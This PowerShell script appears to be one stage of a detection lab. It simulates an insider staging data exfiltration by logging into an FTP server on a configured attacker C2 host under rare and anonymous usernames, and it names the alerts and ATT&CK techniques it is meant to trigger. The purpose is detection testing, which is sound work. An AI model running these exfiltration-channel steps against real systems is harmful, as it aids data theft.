<#
    Stage 2 (MIDDLE) - Staging: new FTP server / rare FTP user
    ==========================================================
    The insider opens an exfil channel to an FTP server the org has never seen,
    logging in as an unusual user - staging before the bulk transfer.

      EAL alerts: 'New FTP Server'                             (rule ce208ea2)
                  'A rare FTP user has been detected on an FTP server' (rule df8fa99b)
      ATT&CK    : Collection / Initial Access (TA0009/TA0001) /
                  Data from Information Repositories (T1213), Valid Accounts (T1078)
#>
param([switch]$DryRun)
. "$PSScriptRoot\..\config\lab-config.ps1"
. "$PSScriptRoot\_net.ps1"
$cfg = $Global:EalDemo
if ($DryRun) { $cfg.DryRun = $true }

Write-Stage "STAGE 2 (MIDDLE): opening exfil FTP channel to $($cfg.AttackerC2) as '$($cfg.FtpUser)'" "INFO"
Invoke-Ftp -Server $cfg.AttackerC2 -User $cfg.FtpUser        -Pass "Leaver#2026"  -Label "rare FTP user"
Invoke-Ftp -Server $cfg.AttackerC2 -User "anonymous"          -Pass "x@x.com"     -Label "new FTP server probe"
Invoke-Ftp -Server $cfg.AttackerC2 -User "$($cfg.FtpUser)_bak" -Pass "Leaver#2026" -Label "rare FTP user 2"
Write-Stage "STAGE 2 done. Expect EAL: 'New FTP Server' (ce208ea2) + 'A rare FTP user...' (df8fa99b)." "OK"
